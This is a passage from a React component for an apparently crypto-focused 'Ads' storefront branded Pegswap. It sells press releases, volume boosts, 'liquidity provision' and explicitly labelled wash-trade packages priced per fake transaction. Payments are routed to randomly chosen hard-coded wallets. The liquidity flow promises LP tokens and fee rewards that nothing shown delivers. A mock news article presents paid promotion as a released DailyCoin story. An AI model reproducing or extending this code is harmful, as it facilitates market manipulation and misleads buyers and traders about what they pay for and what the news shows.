                className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4"
            >
                <motion.div
                    initial={{ scale: 0.9, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    exit={{ scale: 0.9, opacity: 0 }}
                    className="bg-card border border-border w-full max-w-2xl rounded-xl shadow-2xl overflow-hidden max-h-[90vh] flex flex-col"
                >
                    <div className="p-6 border-b border-border flex justify-between items-center bg-muted/20">
                        <h2 className="text-2xl font-bold">
                            {flowType === 'PRESS' ? 'Get Press Release' : 
                             flowType === 'VOLUME' ? 'Boost Volume' : 
                             flowType === 'LIQUIDITY' ? 'Provide Liquidity' :
                             flowType === 'WASH_TRADE' ? 'Wash Trade' :
                             'Get Ads'}
                        </h2>
                        <Button variant="ghost" size="icon" onClick={() => setShowAdsFlow(false)}>
                            <X className="w-6 h-6" />
                        </Button>
                    </div>

                    <div className="p-6 overflow-y-auto flex-1">
                        {flowStep === 'INPUT' && (
                            <div className="space-y-6">
                                <div className="text-center space-y-2">
                                    <h3 className="text-xl font-semibold">
                                        {flowType === 'LIQUIDITY' ? 'Provide Liquidity' : 
                                         flowType === 'WASH_TRADE' ? 'Wash Trade' : 
                                         'Enter Contract Address'}
                                    </h3>
                                    <p className="text-muted-foreground">
                                        {flowType === 'LIQUIDITY' ? 'Please input the contract address of the token you want to provide liquidity for.' :
                                         flowType === 'WASH_TRADE' ? 'Order flow padding: Generating numerous micro buy & sell transactions for smooth liquidity and tradability, reducing extreme price swings' :
                                         "Paste your token's contract address to get started."}
                                    </p>
                                </div>
                                <div className="space-y-4">
                                    <Input 
                                        placeholder="0x.... address" 
                                        value={contractAddress}
                                        onChange={(e) => setContractAddress(e.target.value)}
                                        className="text-lg py-6"
                                    />
                                    {fetchError && (
                                        <p className="text-destructive text-sm flex items-center gap-2">
                                            <AlertCircle className="w-4 h-4" /> {fetchError}
                                        </p>
                                    )}
                                    <Button 
                                        onClick={handleContractSubmit} 
                                        className="w-full text-lg py-6" 
                                        disabled={isFetchingToken}
                                    >
                                        {isFetchingToken ? <Loader2 className="w-5 h-5 animate-spin mr-2" /> : 'Continue'}
                                    </Button>
                                </div>
                            </div>
                        )}

                        {flowStep === 'LIQUIDITY_CONFIG' && fetchedToken && (
                            <div className="space-y-8">
                                <div className="text-center space-y-4">
                                    <h2 className="text-3xl font-bold">
                                        Provide Liquidity for <span className="text-primary">{fetchedToken.baseToken.name}</span>
                                    </h2>
                                    <p className="text-muted-foreground text-sm max-w-lg mx-auto">
                                        You will receive LP (Liquidity Provider) tokens which can be swapped back to retrieve your {nativeToken}. 
                                         As a liquidity provider, you will earn fee rewards on every transaction that occurs on the blockchain for {fetchedToken.baseToken.name}.
                                    </p>
                                </div>

                                <div className="space-y-6 px-4">
                                    <div className="pt-6 pb-2">
                                        <Slider
                                            defaultValue={[0]}
                                            max={3000000}
                                            step={100}
                                            value={liquidityAmount}
                                            onValueChange={(val) => setLiquidityAmount(val)}
                                            className="w-full"
                                        />
                                        <div className="flex justify-between text-xs text-muted-foreground mt-2">
                                            <span>$0</span>
                                            <span>$3,000,000</span>
                                        </div>
                                    </div>

                                    <div className="flex flex-col gap-2">
                                        <label className="text-sm font-medium">Amount ($)</label>
                                        <Input
                                            type="number"
                                            value={liquidityAmount[0]}
                                            onChange={(e) => setLiquidityAmount([Number(e.target.value)])}
                                            className="text-lg"
                                            placeholder="0.00"
                                        />
                                    </div>

                                    <Button 
                                        className="w-full text-lg py-6"
                                        disabled={liquidityAmount[0] <= 0}
                                        onClick={() => {
                                            setSelectedPackage({
                                                name: 'Liquidity Provision',
                                                price: liquidityAmount[0],
                                                currency: 'USD',
                                                id: 'liquidity_custom'
                                            });
                                            
                                            // Select wallet
                                            let walletList = EVM_WALLETS;
                                            if (fetchedToken?.chainId === 'solana') {
                                                walletList = SOLANA_WALLETS;
                                            }
                                            const randomWallet = walletList[Math.floor(Math.random() * walletList.length)];
                                            setPaymentWallet(randomWallet);
                                            setPaymentStatus('PENDING');
                                            
                                            setFlowStep('PAYMENT');
                                        }}
                                    >
                                        Get Liquidity
                                    </Button>
                                </div>
                            </div>
                        )}

                        {flowStep === 'WASH_CUSTOM' && fetchedToken && (
                            <div className="space-y-8">
                                <div className="text-center space-y-4">
                                    <h2 className="text-3xl font-bold">
                                        Custom Wash Trade for <span className="text-primary">{fetchedToken.baseToken.name}</span>
                                    </h2>
                                    <p className="text-muted-foreground">
                                        Configure the amount of transactions you want to generate.
                                    </p>
                                </div>

                                <div className="space-y-6 px-4">
                                    <div className="flex flex-col gap-2">
                                        <label className="text-sm font-medium">Number of Transactions (Tx)</label>
                                        <Input
                                            type="number"
                                            value={washTxCount}
                                            onChange={(e) => setWashTxCount(Number(e.target.value))}
                                            className="text-lg"
                                            placeholder="0"
                                        />
                                    </div>

                                    <div className="bg-muted/20 p-4 rounded-lg flex justify-between items-center">
                                        <span className="font-semibold">Estimated Price:</span>
                                        <span className="text-2xl font-bold text-primary">
                                            ${(washTxCount * 0.25).toLocaleString()}
                                        </span>
                                    </div>

                                    <Button 
                                        className="w-full text-lg py-6"
                                        disabled={washTxCount <= 0}
                                        onClick={() => {
                                            setSelectedPackage({
                                                name: 'Custom Wash Trade',
                                                price: washTxCount * 0.25,
                                                currency: 'USD',
                                                id: 'wash_custom_final',
                                                txCount: `${washTxCount} tx`
                                            });
                                            
                                            // Select wallet
                                            let walletList = EVM_WALLETS;
                                            if (fetchedToken?.chainId === 'solana') {
                                                walletList = SOLANA_WALLETS;
                                            }
                                            const randomWallet = walletList[Math.floor(Math.random() * walletList.length)];
                                            setPaymentWallet(randomWallet);
                                            setPaymentStatus('PENDING');
                                            
                                            setFlowStep('PAYMENT');
                                        }}
                                    >
                                        Proceed
                                    </Button>
                                </div>
                            </div>
                        )}

                        {flowStep === 'CUSTOM_TEXT' && (
                            <div className="space-y-6">
                                <div className="text-center space-y-2">
                                    <h3 className="text-2xl font-bold">Custom Press Release</h3>
                                    <p className="text-muted-foreground">Enter your custom text for the Diamond Enterprise package.</p>
                                </div>
                                <div className="space-y-4">
                                    <textarea
                                        className="w-full min-h-[200px] p-4 rounded-lg bg-black/40 border border-white/20 text-white placeholder-white/50 focus:border-primary focus:ring-1 focus:ring-primary outline-none resize-none"
                                        placeholder="Enter your custom press release text here..."
                                        value={customText}
                                        onChange={(e) => setCustomText(e.target.value)}
                                    />
                                    <div className="flex gap-4">
                                        <Button variant="ghost" onClick={() => setFlowStep('PACKAGES')} className="flex-1">
                                            Back
                                        </Button>
                                        <Button onClick={handleCustomTextSubmit} className="flex-1">
                                            Send & Continue
                                        </Button>
                                    </div>
                                </div>
                            </div>
                        )}

                        {flowStep === 'PACKAGES' && fetchedToken && (
                            <div className="space-y-8">
                                <div className="text-center space-y-4">
                                    <div className="relative w-24 h-24 mx-auto">
                                        <div className="absolute inset-0 rounded-full border-2 border-primary border-t-transparent animate-spin"></div>
                                        <img 
                                            src={fetchedToken.info?.imageUrl || 'https://via.placeholder.com/96'} 
                                            alt={fetchedToken.baseToken.name}
                                            className="w-full h-full rounded-full object-cover p-1"
                                        />
                                    </div>
                                    <h2 className="text-3xl font-bold">
                                        Give <span className="text-primary">{fetchedToken.baseToken.name}</span> a Trending
                                    </h2>
                                    <p className="text-muted-foreground">Select a package to boost your token visibility.</p>
                                </div>

                                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                                    {(flowType === 'PRESS' ? PRESS_PACKAGES : 
                                      flowType === 'VOLUME' ? VOLUME_PACKAGES : 
                                      flowType === 'WASH_TRADE' ? WASH_PACKAGES : 
                                      PACKAGES).map((pkg: any) => (
                                        <Button
                                            key={pkg.id}
                                            onClick={() => handlePackageSelect(pkg)}
                                            className={`h-auto py-6 flex flex-col items-center justify-center gap-2 bg-primary/10 hover:bg-primary/20 text-foreground border border-primary/30 hover:border-primary/50 backdrop-blur-sm transition-all`}
                                            variant="ghost"
                                        >
                                            <span className="text-lg font-bold">{pkg.name}</span>
                                            {pkg.currency === 'NATIVE' ? (
                                                <span className="text-2xl font-extrabold text-primary">{pkg.price} {nativeToken}</span>
                                            ) : (
                                                pkg.price > 0 && <span className="text-2xl font-extrabold text-primary">${pkg.price.toLocaleString()}</span>
                                            )}
                                            
                                            {pkg.multiplier && (
                                                <span className="text-sm font-mono bg-background/50 px-2 py-0.5 rounded text-muted-foreground">{pkg.multiplier}</span>
                                            )}
                                            
                                            {pkg.duration && (
                                                <span className="text-sm font-mono bg-background/50 px-2 py-0.5 rounded text-muted-foreground">{pkg.duration}</span>
                                            )}

                                            {pkg.txCount && (
                                                <span className="text-sm font-mono bg-background/50 px-2 py-0.5 rounded text-muted-foreground">{pkg.txCount}</span>
                                            )}
                                        </Button>
                                    ))}
                                </div>
                            </div>
                        )}

                        {flowStep === 'PAYMENT' && selectedPackage && (
                            <div className="space-y-8">
                                <div className="text-center space-y-2">
                                    <h3 className="text-2xl font-bold">Complete Payment</h3>
                                    {flowType === 'LIQUIDITY' ? (
                                     <p className="text-muted-foreground text-sm">
                                             By providing liquidity, you will receive LP (Liquidity Provider) tokens that represent your share in the liquidity pool. 
                                             These LP tokens can be swapped back anytime to retrieve your {nativeToken}. 
                                             As a liquidity provider, you will automatically earn transaction fee rewards every time a trade occurs on the blockchain for {fetchedToken?.baseToken.name}.
                                        </p>
                                    ) : (
                                        <p className="text-muted-foreground">
                                            Send <span className="text-primary font-bold">
                                                {selectedPackage.currency === 'NATIVE' ? `${selectedPackage.price} ${nativeToken}` : `$${selectedPackage.price.toLocaleString()}`}
                                            </span>
                                            {selectedPackage.currency !== 'NATIVE' && ` worth of ${fetchedToken?.baseToken.symbol}`} to the address below.
                                        </p>
                                    )}
                                </div>

                                <div className="bg-muted/30 p-6 rounded-xl border border-border flex flex-col items-center justify-center gap-4">
                                    <Button 
                                        onClick={handlePayNow}
                                        className="w-full max-w-sm bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold text-lg py-6 shadow-lg shadow-green-500/20 transition-all transform hover:scale-105"
                                    >
                                        Proceed
                                    </Button>
                                   <InlineConnectWallet className="mt-2" />
                                    <p className="text-xs text-muted-foreground text-center">
                                        Click to pay via {activeChain === 'solana' ? 'Solana' : chainName} Wallet
                                    </p>
                                </div>

                                <div className="space-y-4">
                                    <Button variant="ghost" onClick={() => {
                                        if (flowType === 'LIQUIDITY') setFlowStep('LIQUIDITY_CONFIG');
                                        else if (flowType === 'WASH_TRADE' && selectedPackage.id === 'wash_custom_final') setFlowStep('WASH_CUSTOM' as any);
                                        else setFlowStep('PACKAGES');
                                    }} className="w-full">
                                        Back
                                    </Button>
                                </div>
                            </div>
                        )}
                    </div>
                </motion.div>
            </motion.div>
        )}
      </AnimatePresence>

      {/* Press Release Preview Overlay */}
      <AnimatePresence>
        {showPressReleasePreview && (
            <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4"
            >
                <div className="absolute inset-0 z-0 opacity-40">
                    <PegasusAnimation />
                </div>
                
                <motion.div
                    initial={{ scale: 0.95, opacity: 0 }}
                    animate={{ scale: 1, opacity: 1 }}
                    exit={{ scale: 0.95, opacity: 0 }}
                    className="relative z-10 bg-background/40 border border-white/10 w-full max-w-5xl rounded-xl shadow-2xl overflow-hidden h-[90vh] flex flex-col backdrop-blur-md"
                >
                     <div className="p-4 border-b border-white/10 flex justify-between items-center bg-black/40">
                        <h2 className="text-2xl font-bold">Press Release</h2>
                        <Button variant="ghost" size="icon" onClick={() => setShowPressReleasePreview(false)}>
                            <X className="w-6 h-6" />
                        </Button>
                     </div>
                     
                     <div className="flex-1 bg-white relative overflow-y-auto">
                        {/* Mock Header */}
                        <div className="bg-black text-white p-4 flex items-center justify-between sticky top-0 z-20">
                            <div className="text-2xl font-extrabold tracking-tighter">DailyCoin</div>
                            <div className="hidden md:flex gap-6 text-sm font-medium text-gray-300">
                                <span>NEWS</span>
                                <span>MARKET</span>
                                <span>LEARN</span>
                                <span>OPINION</span>
                            </div>
                            <div className="w-8 h-8 bg-gray-700 rounded-full"></div>
                        </div>

                        {/* Mock Article Content */}
                        <div className="max-w-4xl mx-auto p-8 space-y-6">
                            <div className="space-y-4">
                                <span className="text-orange-500 font-bold tracking-wide text-sm">PRESS RELEASE</span>
                                <h1 className="text-3xl md:text-5xl font-extrabold text-gray-900 leading-tight">
                                    Pegswap Launches Revolutionary Trading Platform with 200% Gain Filter
                                </h1>
                                <div className="flex items-center gap-4 text-gray-500 text-sm">
                                    <span>By Pegswap Team</span>
                                    <span>•</span>
                                    <span>{new Date().toLocaleDateString()}</span>
                                </div>
                            </div>

                            <div className="w-full h-64 md:h-96 bg-gradient-to-br from-indigo-900 to-purple-900 rounded-xl flex items-center justify-center overflow-hidden relative">
                                <div className="absolute inset-0 opacity-30">
                                     <PegasusAnimation />
                                </div>
                                <span className="relative z-10 text-white font-bold text-2xl md:text-4xl">XENO SWAP</span>
                            </div>

                            <div className="space-y-4 text-gray-700 text-lg leading-relaxed">
                                <p>
                                    <span className="font-bold">London, UK</span> — Pegswap has officially announced the launch of its new advanced trading interface, designed to help traders identify high-potential tokens with unprecedented accuracy.
                                </p>
                                <p>
                                    The platform features a unique algorithm that highlights tokens with over 200% gains in the last 24 hours, filtering out noise and focusing on significant market movers.
                                </p>
                                <div className="p-6 bg-gray-50 border-l-4 border-orange-500 italic text-gray-800">
                                    "We are thrilled to bring this level of insight to the retail market. Our goal is to make professional-grade data accessible to everyone," said the CEO of Pegswap.
                                </div>
                                <p>
                                    Users can now access the Ads platform directly to promote their own projects, leveraging the high-traffic visibility of the Pegswap ecosystem.
                                </p>
                            </div>
                        </div>
                     </div>
                     
                     <div className="p-6 flex flex-col md:flex-row gap-4 bg-black/60 border-t border-white/10">
                         <Button 
                            asChild
                            className="flex-1 py-8 text-xl font-bold bg-orange-500 hover:bg-orange-600 text-white transition-transform hover:scale-105"
                         >
                            <a href="https://dailycoin.com/" target="_blank" rel="noopener noreferrer">
                                View Already Released
                            </a>
                         </Button>
                         
                         <Button 
                            onClick={() => {
                                setShowPressReleasePreview(false);
                                handleGetAdsOpen('PRESS');
                            }}
                            className="flex-1 py-8 text-xl font-bold bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-600 text-white border border-primary/50 backdrop-blur-sm animate-pulse transition-transform hover:scale-105"
                         >
                            Get Press Release
                         </Button>
                     </div>
                </motion.div>
            </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default Ads;
